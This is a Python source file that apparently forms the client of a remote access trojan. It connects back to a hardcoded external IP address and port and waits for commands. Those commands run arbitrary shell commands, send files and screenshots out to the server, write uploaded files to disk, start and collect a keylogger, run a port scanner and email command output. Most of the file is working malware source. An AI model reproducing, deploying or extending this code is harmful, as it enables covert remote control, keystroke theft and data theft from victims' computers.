import socket
import os
import subprocess
import mail
from PIL import ImageGrab
import tempfile
import keylog
import threading
import port_scan


VERSION = '1.9.2'
AUTHOR = 'admin87'
LOCAL = True
SERVER_ADDR = '217.16.141.210'
LOCAL_ADDR = '192.168.1.64'
HOST = LOCAL_ADDR if LOCAL is True else SERVER_ADDR
PORT = 4761
MAX_FILE_SIZE = 20000000

s = None


def main():
    connect()
    accept_cmd()


def connect():
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.send(str.encode(os.getcwd()))
    except socket.error:
        connect()


def accept_cmd():
    while True:
        cmd = s.recv(1024)
        if len(cmd) > 0:
            if cmd.decode("utf-8").startswith('cd'):
                change_dir(cmd)
            elif cmd.decode("utf-8").startswith('sendmail'):
                send_mail(cmd)
            elif cmd.decode("utf-8").startswith('filedl'):
                download_file(cmd)
            elif cmd.decode("utf-8").startswith('fileup'):
                upload_file(cmd)
            elif cmd.decode("utf-8") == 'screenshot':
                screenshot()
            elif cmd.decode("utf-8").startswith('keylog'):
                keylogger(cmd)
            elif cmd.decode("utf-8").startswith('portscan'):
                port_scanner(cmd)
            else:
                run_cmd(cmd)
    s.close()


def change_dir(cmd):
    try:
        directory = cmd.decode("utf-8")[3:]
        os.chdir(directory)
        s.send(str.encode(str(os.getcwd())))
    except FileNotFoundError:
        s.send(str.encode('[-] Unknown directory!\n\n' + str(os.getcwd())))


def send_mail(cmd):
    try:
        cmd = subprocess.Popen(cmd[9:].decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output, "utf-8")
        mail.send(output_str)
        s.send(str.encode("\n[+] Mail sent!\n"))
        s.send(str.encode(str(os.getcwd())))
    except:
        s.send(str.encode('\n[-] Client failed to send mail!\n' + str(os.getcwd())))


def download_file(cmd):
    try:
        file_path = cmd[7:].decode("utf-8")
        f = open(file_path, 'rb')
        s.send(f.read())
        f.close()
    except:
        s.send(str.encode('\n[-] Client failed to download file!\n' + str(os.getcwd())))


def upload_file(cmd):
    try:
        dest_dir = cmd.decode("utf-8").split("|")[2]
        file_name = (cmd.decode("utf-8").split("|")[1]).split("\\")[-1]
        f = open(dest_dir + '\\' + file_name, 'wb')
        f.write(s.recv(MAX_FILE_SIZE))
        f.close()
        s.send(str.encode(str(os.getcwd())))
    except:
        s.send(str.encode('\n[-] Client failed to upload file!\n' + str(os.getcwd())))


def screenshot():
    try:
        img = ImageGrab.grab()
        image_path = tempfile.gettempdir() + '\\' + 'tmpWx8704.jpg'
        f = open(image_path, 'wb')
        img.save(image_path)
        f.close()
        f = open(image_path, 'rb')
        s.send(f.read())
        f.close()
        img.close()
        os.unlink(image_path)
    except:
        s.send(str.encode('\n[-] Client failed to screenshot!\n' + str(os.getcwd())))


def run_cmd(cmd):
    try:
        cmd = subprocess.Popen(cmd.decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output, "utf-8")
        s.send(str.encode('\n' + output_str))
        s.send(str.encode(str(os.getcwd())))
    except:
        s.send(str.encode('[-] Client failed to run command!\n\n' + str(os.getcwd())))


def keylogger(cmd):
        if cmd.decode("utf-8").split(' ')[1] == 'start':
            try:
                keylog_thread = KeylogThread()
                s.send(str.encode(str(os.getcwd())))
            except:
                s.send(str.encode('[-] Client failed to run command!\n\n' + str(os.getcwd())))
        elif cmd.decode("utf-8").split(' ')[1] == 'stop':
            try:
                keylog.stop_keylog()
                s.send(str.encode(str(os.getcwd())))
            except:
                s.send(str.encode('[-] Failed to stop keylog!\n\n' + str(os.getcwd())))
        elif cmd.decode("utf-8").split(' ')[1] == 'get':
            try:
                f = open(tempfile.gettempdir() + "\\oye_log.txt", 'rb')
                s.send(f.read())
                f.close()
            except:
                pass
        elif cmd.decode("utf-8").split(' ')[1] == 'timed':
            try:
                duration = int(cmd.decode("utf-8").split(' ')[2])
                keylog.start_timed_keylog(duration)
                s.send(str.encode(str(os.getcwd())))
            except ValueError:
                s.send(str.encode('[-] Enter the number of seconds to run keylog for\n\n' + str(os.getcwd())))
            except:
                s.send(str.encode('[-] Client failed to run command!\n\n' + str(os.getcwd())))


def port_scanner(cmd):
    if cmd.decode("utf-8") == 'portscan get':
        try:
            f = open(tempfile.gettempdir() + '\\oye_port.txt', 'rb')
            s.send(f.read())
            f.close()
        except:
            pass
    else:
        try:
            port_thread = PortThread()
            s.send(str.encode(str(os.getcwd())))
        except:
            s.send(str.encode('[-] Client failed to run command!\n\n' + str(os.getcwd())))


class KeylogThread(object):
    def __init__(self, interval=1):
        self.interval = interval
        t = threading.Thread(target=self.run)
        t.daemon = True
        t.start()

    def run(self):
        keylog.start_keylog()


class PortThread(object):
    def __init__(self, interval=1):
        self.interval = interval
        t1 = threading.Thread(target=self.run)
        t1.daemon = True
        t1.start()

    def run(self):
        port_scan.start()

main()
